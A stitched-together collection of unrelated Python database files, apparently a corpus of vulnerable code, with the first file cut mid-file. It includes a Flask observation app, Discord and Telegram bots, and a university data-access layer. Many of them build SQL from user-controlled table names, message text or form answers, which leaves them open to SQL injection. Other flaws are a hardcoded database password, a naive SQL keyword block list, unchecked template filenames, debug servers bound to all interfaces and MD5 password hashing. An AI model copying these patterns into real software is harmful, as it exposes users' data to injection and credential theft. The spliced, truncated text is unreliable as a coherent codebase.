def getProtocoles():
    db = getConnexion()
    sql = "SELECT array_to_json(array_agg(row_to_json(p))) FROM (SELECT * FROM synthese.bib_projet WHERE saisie_possible = TRUE) p"
    db.cur.execute(sql)                    
    return Response(flask.json.dumps(db.cur.fetchone()[0]), mimetype='application/json')



@addObs.route('/loadValues/<protocole>', methods=['GET'])
def getValues(protocole):
    db=getConnexion()
    sql = "SELECT * FROM "+protocole                    
    db.cur.execute(sql)                    
    res = db.cur.fetchall()                    
    finalDict = dict()                    
    for r in res:                    
        dictValues = ast.literal_eval(r[3])                    
        finalDict[r[2]] = dictValues['values']                    
    return Response(flask.json.dumps(finalDict), mimetype='application/json')                    


def getParmeters():
    data = flask.request.json['protocoleForm']
    listKeys = list()
    listValues = list()
    for key, value in data.iteritems():
        listKeys.append(key)
        listValues.append(value)
    return {'keys': listKeys, 'values': listValues}



@addObs.route('/submit/', methods=['POST'])
def submitObs():
    db = getConnexion()
    if flask.request.method == 'POST':
        observateur = flask.request.json['general']['observateur']
        cd_nom = flask.request.json['general']['taxon']['cd_ref']
        loc_exact = flask.request.json['general']['loc_exact']
        code_maille = str()
        loc = flask.request.json['general']['coord']
        x = str(loc['lng'])
        y = str(loc['lat'])
        point = 'POINT('+x+' '+y+')'
        code_maille = flask.request.json['general']['code_maille']
       

        date = flask.request.json['general']['date']
        commentaire = flask.request.json['general']['commentaire']
        comm_loc = flask.request.json['general']['comm_loc']
        protocoleObject = flask.request.json['protocole']

        fullTableName = protocoleObject['nom_schema']+"."+protocoleObject['nom_table']
        protocoleName = protocoleObject['nom_table']
        id_projet = protocoleObject['id_projet']


        #prend le centroide de maille pour intersecter avec la foret et l'insee
        centroid = None
        if not loc_exact:
            point = None
            sql = "SELECT ST_AsText(ST_Centroid(ST_TRANSFORM(geom, 4326))) FROM layers.maille_1_2 WHERE id_maille = %s "
            params = [code_maille]
            db.cur.execute(sql, params)
            res = db.cur.fetchone()
            if res != None:
                centroid = res[0]


        #foret
        sql_foret = """ SELECT ccod_frt FROM layers.perimetre_forets WHERE ST_INTERSECTS(geom,(ST_Transform(ST_GeomFromText(%s, 4326),%s)))"""
        if loc_exact:
            params = [point, config['MAP']['PROJECTION']]
        else:
            params = [centroid, config['MAP']['PROJECTION']]
        db.cur.execute(sql_foret, params)
        res = db.cur.fetchone()
        ccod_frt = None 
        if res != None:
            ccod_frt = res[0]

        # #insee
        sql_insee = """ SELECT code_insee FROM layers.commune WHERE ST_INTERSECTS(geom,(ST_Transform(ST_GeomFromText(%s, 4326),%s)))"""
        if loc_exact:
            params = [point, config['MAP']['PROJECTION']]
        else:
            params = [centroid, config['MAP']['PROJECTION']]
        db.cur.execute(sql_insee, params)
        res = db.cur.fetchone()
        insee = None 
        if res != None:
            insee = res[0]


        #recupere l id_structure a partir de l'info stocker dans la session
        id_structure = session['id_structure']
        valide= False

        generalValues = [id_projet,observateur, date, cd_nom, point, insee, commentaire, valide, ccod_frt, loc_exact, code_maille, id_structure, comm_loc]


        ###protocole 
        stringInsert = "INSERT INTO "+fullTableName+"(id_projet, observateur, date, cd_nom, geom_point, insee, commentaire, valide, ccod_frt, loc_exact, code_maille, id_structure, comm_loc"
        stringValues = ""
        if loc_exact:
            stringValues = "VALUES (%s, %s, %s, %s,  ST_Transform(ST_PointFromText(%s, 4326),"+str(config['MAP']['PROJECTION'])+"), %s, %s, %s, %s, %s, %s, %s, %s"
        else:
            stringValues = "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s"
        keys = getParmeters()['keys']
        values = getParmeters()['values']
        for k in keys:
            stringInsert += ", "+k
            stringValues += ", %s"
        stringInsert+=")"
        stringValues+=")"
        for v in values:
            generalValues.append(v)
        params = generalValues
        sql = stringInsert+stringValues

        db.cur.execute(sql, params)
        db.conn.commit()
        db.closeAll()
    return Response(flask.json.dumps('success'), mimetype='application/json')




    

import psycopg2

#---database table names
user_table = 'user_objects'                    
rank_permit_table = 'rank_privileges'                    

def fetch(query):                    
    conn = psycopg2.connect("dbname=fluffy_bot user=censored password=Laumau11p")                    
    cur = conn.cursor()
    cur.execute(query)                    
    result = cur.fetchall()
    cur.close()
    conn.close()
    return result

def update(query):                    
    conn = psycopg2.connect("dbname=fluffy_bot user=censored password=Laumau11p")                    
    cur = conn.cursor()
    cur.execute(query)                    
    conn.commit()
    cur.close()
    conn.close()

def check(id, attribute, clss):                    
    try:                    
        attribute_value = fetch("SELECT {} FROM {} WHERE id = '{}';".format(attribute, clss, id))                    
    except:                    
        return None                    
    else:
        return attribute_value                    

def rank_check(id, function):                    
    query = check(id, 'rank', user_table)                    
    rank = query[0][0]                    
    query2 = fetch("SELECT {} FROM {} WHERE FUNCTION = '{}';".format(rank, rank_permit_table, function))                    
    if query2[0][0] == True:                    
        return True
    return False

def isInt(ss):                    
    """ Is the given string an integer? """
    try: int(ss)                    
    except ValueError: return False
    else: return True

def is_valid_id(ss):
    '''verifies if id is likely a valid discord id'''
    if type(ss) == type('') and len(ss) >= 15 and len(ss) <= 20 and isInt(ss):                    
        return True
    return False


import main
import db

class User:
    def __init__(self, id, nickname, rank='member', balance=100, events_attd=0):
        self.id = id
        self.nickname = nickname
        self.rank = rank
        self.balance = balance
        self.events_attd = events_attd

async def respond(bot, message):
    await user_add(bot, message)

async def spawn_user(bot, message):
    if not db.check(message.author.id, 'id', db.user_table):                    
        db.update("INSERT INTO {} (id, nickname) VALUES ('{}', '{}');".format(db.user_table, message.author.id, message.author))                    

async def user_add(bot, message):
    #--- call: user add <id> <nickname>
    if message.content.startswith('user add '):
        msg = message.content.split()[2:]
        if db.rank_check(message.author.id, 'user add') and len(msg) == 2 and db.is_valid_id(msg[0]):
            db.update("INSERT INTO {} (id, nickname, rank) VALUES ('{}', '{}', 'member');".format(db.user_table, msg[0], msg[1]))                    

    

#!/usr/bin/python3
"""
takes in the name of a state as an argument and lists all cities of that state
"""
import MySQLdb
from sys import argv

if __name__ == "__main__":

    city_list = []                    
    db = MySQLdb.Connect(host="localhost", port=3306, user=argv[1],                    
                         passwd=argv[2], db=argv[3])                    

    cur = db.cursor()                    
    cur.execute("""                    
    SELECT cities.id, cities.name, states.name                    
    FROM cities                    
    JOIN states ON cities.state_id=states.id                    
    ORDER BY cities.id ASC""")                    

    cities = cur.fetchall()                    
    for city in cities:                    
        if city[2] == argv[4]:                    
            city_list.append(city[1])                    

    print(", ".join(city_list))                    

    cur.close()                    
    db.close()                    

from flask import Flask, render_template, request, url_for
from flask.ext.bootstrap import Bootstrap
import stops
import wi_procedures

app = Flask(__name__)
bootstrap = Bootstrap(app)

@app.route('/')
def main():
    return render_template('main.html')

@app.route('/stop/<pr_name>', methods=['GET', 'POST'])
def stop(pr_name):
    procedure = wi_procedures.get_procedure(pr_name)
    if request.method == 'POST':
        for param in procedure.in_params:
            param.set_value(request.form[param.name])                    
        getattr(stops, pr_name)(procedure)                    
        return render_template('stop.html', procedure=procedure)
    return render_template('stop.html', procedure=procedure)

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html')

if __name__ == '__main__':
	app.debug = False
	app.run(host='0.0.0.0')

from flask import Flask, render_template, request, url_for
from flask.ext.bootstrap import Bootstrap
import stops
import wi_procedures

app = Flask(__name__)
bootstrap = Bootstrap(app)

BAD_WORDS = ['select', 'drop', 'delete', '\'', ';', '--']                    

@app.route('/')
def main():
    return render_template('main.html')

@app.route('/stop/<pr_name>', methods=['GET', 'POST'])
def stop(pr_name):
    procedure = wi_procedures.get_procedure(pr_name)
    if request.method == 'POST':
        sql_injection = False
        for param in procedure.in_params:
            if sql_injection:
                break
            value = request.form[param.name]
            print(value)
            for bw in BAD_WORDS:
                if bw in value:
                    param.set_value('please no \'%s\'' % bw)
                    sql_injection = True
                    break
            if not sql_injection:
                param.set_value(value)
        if not sql_injection:
            getattr(stops, pr_name)(procedure)
        return render_template('stop.html', procedure=procedure)
    return render_template('stop.html', procedure=procedure)

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html')

if __name__ == '__main__':
	app.debug = False
	app.run(host='0.0.0.0')

#!/bin/env python
# encoding: utf-8

import os
import time
import logging
from flask import jsonify
from flask import Flask, request
from flask import render_template
from flask import send_from_directory

import Importer
from DataSource.MySQLDataSource import MySQL
import Config
from Config import logger

app = Flask(__name__)

LOG_DIR = os.environ['LOGFILES_PATH'] if 'LOGFILES_PATH' in os.environ else './logs/'
UPLOADS_DIR = os.environ['DATAFILES_PATH'] if 'DATAFILES_PATH' in os.environ else './uploads/'
DATABASE = os.environ['DB_NAME'] if 'DB_NAME' in os.environ else 'astronomy'


# HTML Services
@app.route('/')
def index():
    # return render_template('import.html')
    return explore()


@app.route('/import')
def import_data():
    return render_template('import.html')


@app.route('/visualize')
def visualize():
    return render_template('visualization.html')


@app.route('/explore')
def explore():
    return render_template('explore.html')


@app.route('/log/<filename>')
def send_logfile(filename):
    return send_from_directory(LOG_DIR, filename)


@app.route('/partials/<filename>')
def send_partial(filename):
    return render_template('partials/%s' % (filename,))


# Services
@app.route('/upload', methods=['POST'])
def upload():
    datafile = request.files['file']
    c = MySQL.get_connection(DATABASE)
    if datafile:
        try:
            logfile = os.path.splitext(datafile.filename)[0] + str(
                int(time.time())) + '.log'  # given name + current timestamp
            f = logging.FileHandler(os.path.join(LOG_DIR, logfile), 'w')
            Config.setup_logging(f)

            filepath = os.path.join(UPLOADS_DIR, datafile.filename)
            datafile.save(filepath)  # to file system
            Importer.run(filepath, c)

            logger.removeHandler(f)
            f.close()
            return jsonify({"name": datafile.filename, 'log': logfile})
        finally:
            c.close()


@app.route('/stars/<int:page>/<int:limit>')
def stars(page, limit):
    try:
        query = "SELECT * FROM star LIMIT %s OFFSET %s"                    
        db_res = MySQL.execute(DATABASE, query, [limit, page * limit])
        resp = [dict(zip(db_res['columns'], [str(t) if type(t) is bytearray else t for t in row])) for row in
                db_res['rows']]
        return jsonify({'stars': resp, "status": {"message": "Fetched %s stars" % (len(resp),)}})
    except Exception as err:
        logger.exception(err)
        return jsonify({"status": {"message": "Something went wrong"}}), 500


@app.route('/star/<hip>/elements')
def elements_of_star(hip):
    try:
        query = "SELECT DISTINCT element FROM composition WHERE hip = %s"
        res = map(lambda e: e[0], MySQL.execute(DATABASE, query, [hip])['rows'])
        return jsonify({'elements': res})
    except Exception as err:
        logger.exception(err)
        return jsonify({"status": {"message": "Something went wrong"}}), 500


@app.route('/star/<hip>/compositions')
def compositions_of_star(hip):
    try:
        elements = request.args.getlist('elements')
        in_clause = ','.join(['%s'] * len(elements))
        query = """SELECT element, AVG(value)
                    FROM composition WHERE hip = %s AND element IN ({})
                    GROUP BY element;""".format(in_clause)
        res = {}
        for k, v in MySQL.execute(DATABASE, query, [hip] + elements)['rows']:
            res[k] = v
        return jsonify(res)
    except Exception as err:
        logger.exception(err)
        return jsonify({"status": {"message": "Something went wrong"}}), 500


def main():
    app.run(debug=True, host='0.0.0.0')


if __name__ == '__main__':
    main()

# Sources:
# Building a Chatbot using Telegram and Python (Part 1) by Gareth Dwyer

import json, logging, requests, time, urllib
from bisect import bisect
from db_helper import DBHelper

# See https://docs.python.org/3/library/logging.html#logging.basicConfig for basicConfig options and
# https://docs.python.org/3/library/logging.html#logrecord-attributes for format options
logging.basicConfig(filename = 'bot.log', format = "%(asctime)s %(levelname)s %(message)s", level = logging.INFO)

db = DBHelper()

with open('token.txt', 'r') as f:
    bot_token = f.readline().strip()

base_url = 'https://api.telegram.org/bot{}'.format(bot_token)

replies = {}
with open('replies.txt', 'r') as m:
    num_lines, command = m.readline().strip().split(' ')
    num_lines = int(num_lines)
    while num_lines:
        replies[command] = []
        for i in range(num_lines):
            replies[command].append(m.readline().strip())
        num_lines, command = m.readline().strip().split(' ')
        num_lines = int(num_lines)
logging.info("Reply messages loaded into memory")

blacklisted = {}
with open('blacklisted.txt', 'r') as f:
    num_blacklisted = int(f.readline().strip())
    for n in range(num_blacklisted):
        offender = int(f.readline().strip())
        if offender in blacklisted:
            blacklisted[offender] += 1
        else:
            blacklisted[offender] = 1
logging.info("Blacklisted senders loaded into memory")

reporting = {}
reporters_dict = {}
reporters_list = []
last_submitted_times = []
logging.info("Data structures loaded into memory")

# TODO: Remove idle reporters
timeout_oth = 300
timeout_ask = 180
logging.info("Response timeouts loaded into memory")

max_ans_len = 70
num_questions = len(replies['questions'])
report_cooldown = 1800                    
logging.info("Other variables loaded into memory")

def get_json_from_url(url):
    response = requests.get(url)
    decoded_content = response.content.decode('utf-8')
    logging.info("GET %s responded with %s", url, decoded_content)
    return json.loads(decoded_content)

def get_updates(timeout, offset = None):
    url = '{}/getUpdates?timeout={}'.format(base_url, timeout)
    if offset:
        url += '&offset={}'.format(offset)
    return get_json_from_url(url)

def get_latest_update_id(updates):
    update_ids = []
    for update in updates['result']:
        update_ids.append(int(update['update_id']))
    latest_update_id = max(update_ids)
    logging.info("get_latest_update_id: Latest update ID is %d of %s", latest_update_id, update_ids)
    return latest_update_id

def get_latest_chat_id_and_text(updates):
    text = updates['result'][-1]['message']['text'].encode('utf-8')
    chat_id = updates['result'][-1]['message']['chat']['id']
    logging.info("get_latest_chat_id_and_text: Latest message is %s from chat %d", text, chat_id)
    return (text, chat_id)

def send_message(text, chat_id):
    text = urllib.parse.quote_plus(text)
    url = '{}/sendMessage?text={}&chat_id={}&parse_mode=Markdown'.format(base_url, text, chat_id)
    logging.info("send_message: Sending %s to chat %d", text, chat_id)
    requests.get(url)

def handle_updates(updates, latest_update_id):
    for update in updates['result']:
        try:
            text = update['message']['text']
            chat = update['message']['chat']['id']
            sender = update['message']['from']['id']
            is_ascii = all(ord(char) < 128 for char in text)
            logging.info("handle_updates: Received %s from %d", text.encode('utf-8'), sender)

            if not is_ascii:
                send_message(replies['invalid'][0], chat)
                continue

            if sender in reporting:
                if validate_answer(text):
                    reporting[sender].append(text)
                    reporting[sender][0] += 1
                    if reporting[sender][0] >= num_questions:
                        answers = reporting[sender][1:]
                        inserted, violations = db.insert(answers)
                        reporting.pop(sender)
                        if inserted:
                            logging.info("handle_updates: Insert %s returns %r", str(answers), inserted)                    
                            send_message(replies['thanks'][0], chat)
                            last_submitted = int(time.time())
                            reporters_dict[sender] = last_submitted
                            reporters_list.append(sender)
                            last_submitted_times.append(last_submitted)
                        else:
                            send_message(replies['invalid'][0], chat)
                    else:
                        send_message(replies['questions'][reporting[sender][0]], chat)
                else:
                    send_message(replies['invalid'][0], chat)
                    send_message(replies['questions'][reporting[sender][0]], chat)
            elif text == '/help':
                send_message(replies[text][0], chat)
            elif text == '/start':
                send_message('\n'.join(replies[text]), chat)
            elif text == '/report':
                if sender in blacklisted:
                    send_message(replies['blacklisted'][0], chat)
                elif is_recent_reporter(sender):
                    logging.info("handle_updates: %d not in blacklist", sender)                    
                    send_message(replies['cooldown'][0], chat)
                else:
                    send_message(replies[text][0], chat)
                    reporting[sender] = [0]
                    send_message(replies['questions'][0], chat)
            elif text == '/view':
                send_message(replies[text][0] + db.select_recent_pretty(), chat)
            else:
                send_message(replies['dk'][0], chat)
        except KeyError:
            pass

def is_recent_reporter(sender_id):
    global reporters_dict, reporters_list, last_submitted_times
    least_recent_index = bisect(last_submitted_times, int(time.time()) - report_cooldown)
    for expired_reporter in range(least_recent_index):                    
        reporters_dict.pop(expired_reporter)                    
    last_submitted_times = last_submitted_times[least_recent_index:]
    reporters_list = reporters_list[least_recent_index:]
    is_recent = sender_id in reporters_dict
    logging.info("is_recent_reporter: %d returns %r", sender_id, is_recent)
    return is_recent

def validate_answer(ans):
    too_long = len(ans) > max_ans_len                    
    logging.info("validate_answer: %s returns %r", str(ans), not too_long)                    
    return not too_long                    

def main():
    db.create_table()
    latest_update_id = None
    while True:
        updates = get_updates(timeout_oth, latest_update_id)
        if updates['result']:
            latest_update_id = get_latest_update_id(updates) + 1
            handle_updates(updates, latest_update_id)
        time.sleep(1)

if __name__ == '__main__':
    main()

# Sources:
# Building a Chatbot using Telegram and Python (Part 2) by Gareth Dwyer

from time import strftime, time
from pretty_date import prettify_date
import sqlite3

db_name = "robodb.sqlite"
tb_name = "robotb"
mapping = "timestamp INTEGER, name TEXT, location TEXT, description TEXT"
columns = "timestamp, name, location, description"
one_week = 604800    # 1 week
one_year = 31540000  # 1 year
max_data_length = 70 # 70 characters

# Question mark style does not work here for some unknown reason
# This way of string formatting may be vulnerable to SQL injection

class DBHelper:
    def __init__(self):
        self.db_name = db_name
        self.connection = sqlite3.connect(self.db_name)

    def create_table(self):
        stmt = "CREATE TABLE IF NOT EXISTS {} ({})".format(tb_name, mapping)
        self.connection.execute(stmt)
        self.connection.commit()

    def insert(self, input_row):
        is_valid, violations = self.validate_row(input_row)
        if is_valid:
            name, location, description = input_row
            date = int(time())
            args = (date, name, location, description)
            stmt = "INSERT INTO {} ({}) VALUES {}".format(tb_name, columns, str(args))
            self.connection.execute(stmt)
            self.connection.commit()
        return (is_valid, violations)

    def select_recent(self):
        last = int(time()) - one_week
        stmt = "SELECT {} FROM {} WHERE timestamp >= {} ORDER BY timestamp DESC".format(
            columns, tb_name, str(last))
        rows = self.connection.execute(stmt)
        return rows

    def delete_old(self):
        last = int(time()) - one_year
        stmt = "DELETE FROM {} WHERE timestamp >= {}".format(tb_name, str(last))
        self.connection.execute(stmt)
        self.connection.commit()

    def select_recent_pretty(self):
        return self.prettify_rows(self.select_recent())

    def prettify_rows(self, rows):
        str_builder = ['\n']
        for row in rows:
            str_builder.append("When: {}".format(prettify_date(row[0])))
            str_builder.extend(row[1:])
            str_builder.append('')
        return '\n'.join(str_builder)

    def validate_row(self, input_row):
        length_exceeded = [data for data in input_row if len(data) > max_data_length]                    
        if length_exceeded:                    
            return (False, length_exceeded)                    
        return (True, [])

# IVLE - Informatics Virtual Learning Environment
# Copyright (C) 2007-2008 The University of Melbourne
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

# Module: Database
# Author: Matt Giuca
# Date:   15/2/2008

# Code to talk to the PostgreSQL database.
# (This is the Data Access Layer).
# All DB code should be in this module to ensure portability if we want to
# change the DB implementation.
# This means no SQL strings should be outside of this module. Add functions
# here to perform the activities needed, and place the SQL code for those
# activities within.

# CAUTION to editors of this module.
# All string inputs must be sanitized by calling _escape before being
# formatted into an SQL query string.

import pg
import conf
import md5
import copy
import time

from common import (caps, user)

TIMESTAMP_FORMAT = '%Y-%m-%d %H:%M:%S'

def _escape(val):
    """Wrapper around pg.escape_string. Prepares the Python value for use in
    SQL. Returns a string, which may be safely placed verbatim into an SQL
    query.
    Handles the following types:
    * str: Escapes the string, and also quotes it.
    * int/long/float: Just converts to an unquoted string.
    * bool: Returns as "TRUE" or "FALSE", unquoted.
    * NoneType: Returns "NULL", unquoted.
    * common.caps.Role: Returns the role as a quoted, lowercase string.
    Raises a DBException if val has an unsupported type.
    """
    # "E'" is postgres's way of making "escape" strings.
    # Such strings allow backslashes to escape things. Since escape_string
    # converts a single backslash into two backslashes, it needs to be fed
    # into E mode.
    # Ref: http://www.postgresql.org/docs/8.2/static/sql-syntax-lexical.html
    # WARNING: PostgreSQL-specific code
    if val is None:
        return "NULL"
    elif isinstance(val, str):
        return "E'" + pg.escape_string(val) + "'"
    elif isinstance(val, bool):
        return "TRUE" if val else "FALSE"
    elif isinstance(val, int) or isinstance(val, long) \
        or isinstance(val, float):
        return str(val)
    elif isinstance(val, caps.Role):
        return _escape(str(val))
    elif isinstance(val, time.struct_time):
        return _escape(time.strftime(TIMESTAMP_FORMAT, val))
    else:
        raise DBException("Attempt to insert an unsupported type "
            "into the database")

def _passhash(password):
    return md5.md5(password).hexdigest()

class DBException(Exception):
    """A DBException is for bad conditions in the database or bad input to
    these methods. If Postgres throws an exception it does not get rebadged.
    This is only for additional exceptions."""
    pass

class DB:
    """An IVLE database object. This object provides an interface to
    interacting with the IVLE database without using any external SQL.

    Most methods of this class have an optional dry argument. If true, they
    will return the SQL query string and NOT actually execute it. (For
    debugging purposes).

    Methods may throw db.DBException, or any of the pg exceptions as well.
    (In general, be prepared to catch exceptions!)
    """
    def __init__(self):
        """Connects to the database and creates a DB object.
        Takes no parameters - gets all the DB info from the configuration."""
        self.open = False
        self.db = pg.connect(dbname=conf.db_dbname, host=conf.db_host,
                port=conf.db_port, user=conf.db_user, passwd=conf.db_password)
        self.open = True

    def __del__(self):
        if self.open:
            self.db.close()

    # GENERIC DB FUNCTIONS #

    @staticmethod
    def check_dict(dict, tablefields, disallowed=frozenset([]), must=False):
        """Checks that a dict does not contain keys that are not fields
        of the specified table.
        dict: A mapping from string keys to values; the keys are checked to
            see that they correspond to login table fields.
        tablefields: Collection of strings for field names in the table.
            Only these fields will be allowed.
        disallowed: Optional collection of strings for field names that are
            not allowed.
        must: If True, the dict MUST contain all fields in tablefields.
            If False, it may contain any subset of the fields.
        Returns True if the dict is valid, False otherwise.
        """
        allowed = frozenset(tablefields) - frozenset(disallowed)
        dictkeys = frozenset(dict.keys())
        if must:
            return allowed == dictkeys
        else:
            return allowed.issuperset(dictkeys)

    def insert(self, dict, tablename, tablefields, disallowed=frozenset([]),
        dry=False):
        """Inserts a new row in a table, using data from a supplied
        dictionary (which will be checked by check_dict).
        dict: Dictionary mapping column names to values. The values may be
            any of the following types:
            str, int, long, float, NoneType.
        tablename: String, name of the table to insert into. Will NOT be
            escaped - must be a valid identifier.
        tablefields, disallowed: see check_dict.
        dry: Returns the SQL query as a string, and does not execute it.
        Raises a DBException if the dictionary contains invalid fields.
        """
        if not DB.check_dict(dict, tablefields, disallowed):
            extras = set(dict.keys()) - tablefields
            raise DBException("Supplied dictionary contains invalid fields. (%s)" % (repr(extras)))
        # Build two lists concurrently: field names and values, as SQL strings
        fieldnames = []
        values = []
        for k,v in dict.items():
            fieldnames.append(k)
            values.append(_escape(v))
        if len(fieldnames) == 0: return
        fieldnames = ', '.join(fieldnames)
        values = ', '.join(values)
        query = ("INSERT INTO %s (%s) VALUES (%s);"
            % (tablename, fieldnames, values))
        if dry: return query
        self.db.query(query)

    def update(self, primarydict, updatedict, tablename, tablefields,
        primary_keys, disallowed_update=frozenset([]), dry=False):
        """Updates a row in a table, matching against primarydict to find the
        row, and using the data in updatedict (which will be checked by
        check_dict).
        primarydict: Dict mapping column names to values. The keys should be
            the table's primary key. Only rows which match this dict's values
            will be updated.
        updatedict: Dict mapping column names to values. The columns will be
            updated with the given values for the matched rows.
        tablename, tablefields, disallowed_update: See insert.
        primary_keys: Collection of strings which together form the primary
            key for this table. primarydict must contain all of these as keys,
            and only these keys.
        """
        if (not (DB.check_dict(primarydict, primary_keys, must=True)
            and DB.check_dict(updatedict, tablefields, disallowed_update))):
            raise DBException("Supplied dictionary contains invalid or missing fields (1).")
        # Make a list of SQL fragments of the form "field = 'new value'"
        # These fragments are ALREADY-ESCAPED
        setlist = []
        for k,v in updatedict.items():
            setlist.append("%s = %s" % (k, _escape(v)))
        wherelist = []
        for k,v in primarydict.items():
            wherelist.append("%s = %s" % (k, _escape(v)))
        if len(setlist) == 0 or len(wherelist) == 0:
            return
        # Join the fragments into a comma-separated string
        setstring = ', '.join(setlist)
        wherestring = ' AND '.join(wherelist)
        # Build the whole query as an UPDATE statement
        query = ("UPDATE %s SET %s WHERE %s;"
            % (tablename, setstring, wherestring))
        if dry: return query
        self.db.query(query)

    def delete(self, primarydict, tablename, primary_keys, dry=False):
        """Deletes a row in the table, matching against primarydict to find
        the row.
        primarydict, tablename, primary_keys: See update.
        """
        if not DB.check_dict(primarydict, primary_keys, must=True):
            raise DBException("Supplied dictionary contains invalid or missing fields (2).")
        wherelist = []
        for k,v in primarydict.items():
            wherelist.append("%s = %s" % (k, _escape(v)))
        if len(wherelist) == 0:
            return
        wherestring = ' AND '.join(wherelist)
        query = ("DELETE FROM %s WHERE %s;" % (tablename, wherestring))
        if dry: return query
        self.db.query(query)

    def get_single(self, primarydict, tablename, getfields, primary_keys,
        error_notfound="No rows found", dry=False):
        """Retrieves a single row from a table, returning it as a dictionary
        mapping field names to values. Matches against primarydict to find the
        row.
        primarydict, tablename, primary_keys: See update/delete.
        getfields: Collection of strings; the field names which will be
            returned as keys in the dictionary.
        error_notfound: Error message if 0 rows match.
        Raises a DBException if 0 rows match, with error_notfound as the msg.
        Raises an AssertError if >1 rows match (this should not happen if
            primary_keys is indeed the primary key).
        """
        if not DB.check_dict(primarydict, primary_keys, must=True):
            raise DBException("Supplied dictionary contains invalid or missing fields (3).")
        wherelist = []
        for k,v in primarydict.items():
            wherelist.append("%s = %s" % (k, _escape(v)))
        if len(getfields) == 0 or len(wherelist) == 0:
            return
        # Join the fragments into a comma-separated string
        getstring = ', '.join(getfields)
        wherestring = ' AND '.join(wherelist)
        # Build the whole query as an SELECT statement
        query = ("SELECT %s FROM %s WHERE %s;"
            % (getstring, tablename, wherestring))
        if dry: return query
        result = self.db.query(query)
        # Expecting exactly one
        if result.ntuples() != 1:
            # It should not be possible for ntuples to be greater than 1
            assert (result.ntuples() < 1)
            raise DBException(error_notfound)
        # Return as a dictionary
        return result.dictresult()[0]

    def get_all(self, tablename, getfields, dry=False):
        """Retrieves all rows from a table, returning it as a list of
        dictionaries mapping field names to values.
        tablename, getfields: See get_single.
        """
        if len(getfields) == 0:
            return
        getstring = ', '.join(getfields)
        query = ("SELECT %s FROM %s;" % (getstring, tablename))
        if dry: return query
        return self.db.query(query).dictresult()

    def start_transaction(self, dry=False):
        """Starts a DB transaction.
        Will not commit any changes until self.commit() is called.
        """
        query = "START TRANSACTION;"
        if dry: return query
        self.db.query(query)

    def commit(self, dry=False):
        """Commits (ends) a DB transaction.
        Commits all changes since the call to start_transaction.
        """
        query = "COMMIT;"
        if dry: return query
        self.db.query(query)

    def rollback(self, dry=False):
        """Rolls back (ends) a DB transaction, undoing all changes since the
        call to start_transaction.
        """
        query = "ROLLBACK;"
        if dry: return query
        self.db.query(query)

    # USER MANAGEMENT FUNCTIONS #

    login_primary = frozenset(["login"])
    login_fields_list = [
        "login", "passhash", "state", "unixid", "email", "nick", "fullname",
        "rolenm", "studentid", "acct_exp", "pass_exp", "last_login", "svn_pass"
    ]
    login_fields = frozenset(login_fields_list)

    def create_user(self, user_obj=None, dry=False, **kwargs):
        """Creates a user login entry in the database.
        Two ways to call this - passing a user object, or passing
        all fields as separate arguments.

        Either pass a "user_obj" as the first argument (in which case other
        fields will be ignored), or pass all fields as arguments.

        All user fields are to be passed as args. The argument names
        are the field names of the "login" table of the DB schema.
        However, instead of supplying a "passhash", you must supply a
        "password" argument, which will be hashed internally.
        Also "state" must not given explicitly; it is implicitly set to
        "no_agreement".
        Raises an exception if the user already exists, or the dict contains
        invalid keys or is missing required keys.
        """
        if 'passhash' in kwargs:
            raise DBException("Supplied arguments include passhash (invalid) (1).")
        # Make a copy of the dict. Change password to passhash (hashing it),
        # and set 'state' to "no_agreement".
        if user_obj is None:
            # Use the kwargs
            fields = copy.copy(kwargs)
        else:
            # Use the user object
            fields = dict(user_obj)
        if 'password' in fields:
            fields['passhash'] = _passhash(fields['password'])
            del fields['password']
        if 'role' in fields:
            # Convert role to rolenm
            fields['rolenm'] = str(user_obj.role)
            del fields['role']
        if user_obj is None:
            fields['state'] = "no_agreement"
            # else, we'll trust the user, but it SHOULD be "no_agreement"
            # (We can't change it because then the user object would not
            # reflect the DB).
        if 'local_password' in fields:
            del fields['local_password']
        # Execute the query.
        return self.insert(fields, "login", self.login_fields, dry=dry)

    def update_user(self, login, dry=False, **kwargs):
        """Updates fields of a particular user. login is the name of the user
        to update. The dict contains the fields which will be modified, and
        their new values. If any value is omitted from the dict, it does not
        get modified. login and studentid may not be modified.
        Passhash may be modified by supplying a "password" field, in
        cleartext, not a hashed password.

        Note that no checking is done. It is expected this function is called
        by a trusted source. In particular, it allows the password to be
        changed without knowing the old password. The caller should check
        that the user knows the existing password before calling this function
        with a new one.
        """
        if 'passhash' in kwargs:
            raise DBException("Supplied arguments include passhash (invalid) (2).")
        if "password" in kwargs:
            kwargs = copy.copy(kwargs)
            kwargs['passhash'] = _passhash(kwargs['password'])
            del kwargs['password']
        return self.update({"login": login}, kwargs, "login",
            self.login_fields, self.login_primary, ["login", "studentid"],
            dry=dry)

    def get_user(self, login, dry=False):
        """Given a login, returns a User object containing details looked up
        in the DB.

        Raises a DBException if the login is not found in the DB.
        """
        userdict = self.get_single({"login": login}, "login",
            self.login_fields, self.login_primary,
            error_notfound="get_user: No user with that login name", dry=dry)
        if dry:
            return userdict     # Query string
        # Package into a User object
        return user.User(**userdict)

    def get_users(self, dry=False):
        """Returns a list of all users in the DB, as User objects.
        """
        userdicts = self.get_all("login", self.login_fields, dry=dry)
        if dry:
            return userdicts    # Query string
        # Package into User objects
        return [user.User(**userdict) for userdict in userdicts]

    def get_user_loginid(self, login, dry=False):
        """Given a login, returns the integer loginid for this user.

        Raises a DBException if the login is not found in the DB.
        """
        userdict = self.get_single({"login": login}, "login",
            ['loginid'], self.login_primary,
            error_notfound="get_user_loginid: No user with that login name",
            dry=dry)
        if dry:
            return userdict     # Query string
        return userdict['loginid']

    def user_authenticate(self, login, password, dry=False):
        """Performs a password authentication on a user. Returns True if
        "passhash" is the correct passhash for the given login, False
        if the passhash does not match the password in the DB,
        and None if the passhash in the DB is NULL.
        Also returns False if the login does not exist (so if you want to
        differentiate these cases, use get_user and catch an exception).
        """
